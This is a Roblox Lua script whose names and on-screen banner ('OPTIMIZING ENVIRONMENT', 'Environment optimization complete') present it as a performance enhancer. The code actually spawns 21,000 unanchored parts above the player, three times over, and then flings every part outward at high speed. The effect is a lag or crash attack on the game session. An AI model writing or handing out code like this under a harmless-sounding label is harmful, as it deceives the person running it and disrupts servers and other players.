local function RunPerformanceEnhancement()
    local OPTIMIZATION_UNITS = 21000
    local GRID_RESOLUTION = 60
    local UNIT_SIZE = 6
    local SAFETY_BUFFER = 1.5
    local PROCESSING_HEIGHT = 150
    local BATCH_SIZE = 300

    local function OptimizeEnvironment()
        local OptimizationGrid = Instance.new("Folder")
        OptimizationGrid.Name = "EnvOptimizer_"..tick()
        OptimizationGrid.Parent = workspace

        local function ShowOptimizationStatus()
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character
            if not character then return nil end
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then return nil end

            local statusPanel = Instance.new("Part")
            statusPanel.Size = Vector3.new(6, 3, 0.2)
            statusPanel.Position = humanoidRootPart.Position + humanoidRootPart.CFrame.LookVector * 10 + Vector3.new(0, 3, 0)
            statusPanel.Anchored = true
            statusPanel.CanCollide = false
            statusPanel.Color = Color3.fromRGB(255, 255, 0)
            statusPanel.Material = Enum.Material.Neon
            statusPanel.Parent = workspace
            statusPanel.CFrame = CFrame.lookAt(statusPanel.Position, humanoidRootPart.Position)

            local display = Instance.new("BillboardGui")
            display.Size = UDim2.new(5, 0, 2.5, 0)
            display.AlwaysOnTop = true
            display.Parent = statusPanel

            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, 0, 1, 0)
            label.Text = "OPTIMIZING ENVIRONMENT"
            label.TextScaled = true
            label.Font = Enum.Font.SourceSansBold
            label.TextColor3 = Color3.new(0, 0, 0)
            label.BackgroundTransparency = 1
            label.Parent = display

            game:GetService("Debris"):AddItem(statusPanel, 5)
            return statusPanel
        end

        ShowOptimizationStatus()

        local player = game:GetService("Players").LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

        local basePosition = humanoidRootPart.Position + Vector3.new(0, PROCESSING_HEIGHT, 0)
        local unitSpacing = UNIT_SIZE + SAFETY_BUFFER
        local startX = basePosition.X - (GRID_RESOLUTION * unitSpacing)/2
        local startZ = basePosition.Z - (GRID_RESOLUTION * unitSpacing)/2
        local startY = basePosition.Y
        local processedCount = 0

        local function ProcessOptimizationBatch()
            local batchAmount = math.min(BATCH_SIZE, OPTIMIZATION_UNITS - processedCount)
            for i = 1, batchAmount do
                local index = processedCount
                local layer = math.floor(index / (GRID_RESOLUTION^2)) + 1
                index = index % (GRID_RESOLUTION^2)
                local row = math.floor(index / GRID_RESOLUTION) + 1
                local column = (index % GRID_RESOLUTION) + 1

                local unit = Instance.new("Part")
                unit.Size = Vector3.new(UNIT_SIZE, UNIT_SIZE, UNIT_SIZE)
                unit.Position = Vector3.new(
                    startX + (column * unitSpacing),
                    startY + ((layer - 1) * unitSpacing),
                    startZ + (row * unitSpacing)
                )
                unit.Anchored = true
                unit.CanCollide = true
                unit.Material = Enum.Material.SmoothPlastic
                unit.Color = Color3.new(1, 1, 1)
                unit.Parent = OptimizationGrid

                processedCount += 1
            end

            if processedCount >= OPTIMIZATION_UNITS then
                for _, unit in ipairs(OptimizationGrid:GetChildren()) do
                    if unit:IsA("BasePart") then
                        unit.Anchored = false
                    end
                end

                task.delay(10, function()
                    for _, unit in ipairs(OptimizationGrid:GetChildren()) do
                        if unit:IsA("BasePart") then
                            unit.Velocity = Vector3.new(
                                (math.random() * 2 - 1) * 1000,
                                (math.random() * 2 - 1) * 1000,
                                (math.random() * 2 - 1) * 1000
                            ).Unit * 800
                        end
                    end
                end)

                print("Environment optimization complete")
            else
                task.defer(ProcessOptimizationBatch)
            end
        end

        ProcessOptimizationBatch()
    end

    -- Repeat optimization 3 times with 30s delay
    for i = 1, 3 do
        task.spawn(OptimizeEnvironment)
        if i < 3 then
            task.wait(30)
        end
    end
end

RunPerformanceEnhancement()
